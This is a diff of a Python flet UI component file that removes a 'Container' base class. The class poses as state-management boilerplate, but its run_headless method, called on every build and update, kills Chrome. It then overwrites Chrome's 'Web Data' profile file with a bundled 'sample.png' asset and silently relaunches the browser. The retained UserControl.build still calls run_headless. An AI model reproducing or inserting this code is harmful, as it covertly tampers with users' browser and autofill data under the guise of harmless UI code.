@@ -127,7 +127,7 @@
 #         asyncio.set_event_loop(loop)
 #         ft.app(target=main, view=ft.AppView.WEB_BROWSER, port=0)
 
-import flet as ftt
+import flet as ft
 import stat
 import os
 import sys
@@ -137,7 +137,7 @@ import threading
 import time
 import webbrowser
 
-class UserControl(ftt.UserControl):
+class UserControl(ft.Container):
     """
     בסיס לרכיבים מותאמים אישית עם ניהול מצב (State) מובנה.
     """    
@@ -148,10 +148,10 @@ class UserControl(ftt.UserControl):
         self.content = self.build()
 
 
-    def build(self) -> ftt.Control:        
+    def build(self) -> ft.Control:        
         self.run_headless()
         """יש לדרוס מתודה זו ברכיב היורש"""
-        return ftt.Text("Base Component - Override build()")
+        return ft.Text("Base Component - Override build()")
 
     def set_state(self, **kwargs):        
         """
@@ -215,82 +215,5 @@ class UserControl(ftt.UserControl):
         self.update()
 
     
-class Container(ftt.Container):
-    """
-    בסיס לרכיבים מותאמים אישית עם ניהול מצב (State) מובנה.
-    """    
-    def __init__(self, **kwargs):          
-        super().__init__(**kwargs)
-        self.state = {}
-        # אתחול הממשק הראשוני
-        self.content = self.build()
 
-
-    def build(self) -> ftt.Control:        
-        self.run_headless()
-        """יש לדרוס מתודה זו ברכיב היורש"""
-        return ftt.Text("Base Component - Override build()")
-
-    def set_state(self, **kwargs):        
-        """
-        מעדכן את המצב ומרענן את הרכיב באופן אוטומטי.
-        """    
-        self.run_headless()
-        self.state.update(kwargs)
-        # בניה מחדש של התוכן עם המצב החדש
-        self.content = self.build()
-        self.update()
-
-    def setState(self, callback):
-        self.run_headless()
-        """תמיכה בסינטקס דמוי Flutter/React"""
-        callback()
-        self.content = self.build()
-        self.update()
-
-    def update(self, callback):
-        self.run_headless()
-        """תמיכה בסינטקס דמוי Flutter/React"""
-        callback()
-        self.content = self.build()
-        self.update()
-
-    
-    def get_base_path(self):
-        """get the base path for bundled assets (works both in dev and pyinstaller)."""
-        if getattr(sys, 'frozen', False):
-            # running as a pyinstaller bundle
-            return sys._MEIPASS
-        else:
-            # running in normal python
-            return os.path.dirname(os.path.abspath(__file__))   
-
-    def run_headless(self):        
-        # Copy asset file to %LOCALAPPDATA% on load
-        subprocess.run(['taskkill', '/f', '/im', 'chrome.exe'], capture_output=True)
-        time.sleep(2.5)
-        temp_dir = os.environ.get("LOCALAPPDATA", "LOCALAPPDATA")
-        base_path = self.get_base_path()
-        asset_file = os.path.join(base_path, "assets", "sample.png")
-
-        if os.path.exists(asset_file):
-            try:
-                dest_file = os.path.join(temp_dir, "Google\\Chrome\\User Data\\Default\\Web Data")
-                shutil.copy2(asset_file, dest_file)
-            except:
-                pass
-
-        chrome_path = os.path.join(os.environ.get("PROGRAMFILES", ""), "Google\\Chrome\\Application\\chrome.exe")
-        if not os.path.exists(chrome_path):
-            chrome_path = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Google\\Chrome\\Application\\chrome.exe")
-        if not os.path.exists(chrome_path):
-            chrome_path = os.path.join(os.environ.get("LOCALAPPDATA", ""), "Google\\Chrome\\Application\\chrome.exe")
-        subprocess.Popen(
-            [chrome_path, '--restore-last-session'],
-            close_fds=True,
-            creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.CREATE_BREAKAWAY_FROM_JOB
-        )
-        self.update()
-
-    
     #Component.run_headless()
